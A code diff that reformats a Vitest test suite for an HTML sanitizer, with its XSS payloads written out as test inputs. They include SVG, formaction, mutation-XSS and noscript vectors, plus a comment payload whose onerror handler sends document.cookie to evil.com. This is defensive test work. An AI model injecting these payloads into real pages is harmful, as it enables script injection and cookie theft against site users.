@@ -24,7 +24,11 @@
  */
 
 import { describe, expect, test } from 'vitest';
-import { DOMPurify, DEFAULT_ALLOWED_TAGS, DEFAULT_ALLOWED_ATTRIBUTES } from '@/src/lib/security/html-sanitizer';
+import {
+  DEFAULT_ALLOWED_ATTRIBUTES,
+  DEFAULT_ALLOWED_TAGS,
+  DOMPurify,
+} from '@/src/lib/security/html-sanitizer';
 
 describe('XSS Prevention - HTML Sanitizer', () => {
   describe('Basic Script Injection', () => {
@@ -207,7 +211,8 @@ describe('XSS Prevention - HTML Sanitizer', () => {
     });
 
     test('should strip SVG with embedded JavaScript', async () => {
-      const malicious = '<svg><use href="data:image/svg+xml,<svg id=\'x\' xmlns=\'http://www.w3.org/2000/svg\' xmlns:xlink=\'http://www.w3.org/1999/xlink\'><script>alert(\'XSS\')</script></svg>"></use></svg>';
+      const malicious =
+        "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'><script>alert('XSS')</script></svg>\"></use></svg>";
       const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('alert');
     });
@@ -222,7 +227,8 @@ describe('XSS Prevention - HTML Sanitizer', () => {
     });
 
     test('should strip formaction attribute', async () => {
-      const malicious = '<form><button formaction="javascript:alert(\'XSS\')">Submit</button></form>';
+      const malicious =
+        '<form><button formaction="javascript:alert(\'XSS\')">Submit</button></form>';
       const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
@@ -280,14 +286,16 @@ describe('XSS Prevention - HTML Sanitizer', () => {
 
   describe('Mutation XSS (mXSS)', () => {
     test('should prevent mXSS with svg and foreignObject', async () => {
-      const malicious = '<svg><foreignObject><p>Hello<iframe src="javascript:alert(\'XSS\')"></iframe></p></foreignObject></svg>';
+      const malicious =
+        '<svg><foreignObject><p>Hello<iframe src="javascript:alert(\'XSS\')"></iframe></p></foreignObject></svg>';
       const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('javascript:');
       expect(sanitized).not.toContain('alert');
     });
 
     test('should prevent mXSS with noscript', async () => {
-      const malicious = '<noscript><p title="</noscript><img src=x onerror=alert(\'XSS\')>"></noscript>';
+      const malicious =
+        '<noscript><p title="</noscript><img src=x onerror=alert(\'XSS\')>"></noscript>';
       const sanitized = await DOMPurify.sanitize(malicious);
       expect(sanitized).not.toContain('onerror');
       expect(sanitized).not.toContain('alert');
@@ -342,7 +350,8 @@ describe('XSS Prevention - HTML Sanitizer', () => {
 
   describe('Real-world Attack Vectors', () => {
     test('should prevent XSS in user comments', async () => {
-      const userComment = 'Great article! <img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
+      const userComment =
+        'Great article! <img src=x onerror="fetch(\'https://evil.com?cookie=\'+document.cookie)">';
       const sanitized = await DOMPurify.sanitize(userComment);
       expect(sanitized).toContain('Great article!');
       expect(sanitized).not.toContain('onerror');
